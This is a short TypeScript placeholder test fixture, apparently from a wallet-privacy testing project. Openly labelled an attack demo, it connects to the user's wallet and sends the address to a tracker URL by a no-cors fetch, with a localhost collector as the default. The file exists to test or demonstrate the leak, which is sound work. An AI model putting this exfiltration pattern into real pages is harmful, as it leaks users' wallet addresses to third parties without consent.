// PLACEHOLDER - written by the infra agent only so the fixture build can be tested. The PermitMarket agent replaces it.
import { discoverWallets, connect } from "../../../../shared/wallet.js";

const TRACKER = (import.meta.env.VITE_TRACKER_URL as string | undefined) ?? "http://127.0.0.1:5190/collect";
const root = document.getElementById("app")!;
const banner = document.createElement("h1");
banner.textContent = "ATTACK FIXTURE (placeholder) - deliberately leaks your wallet address to a third-party tracker (demo only)";
const button = document.createElement("button");
button.textContent = "Connect wallet and leak address";
const log = document.createElement("pre");
button.addEventListener("click", async () => {
  const wallets = await discoverWallets();
  const first = wallets[0];
  if (!first) return void (log.textContent = "no wallet found");
  const { address } = await connect(first.provider);
  await fetch(`${TRACKER}?addr=${address}`, { mode: "no-cors" });
  log.textContent = `sent ${address} to ${TRACKER}`;
});
root.append(banner, button, log);
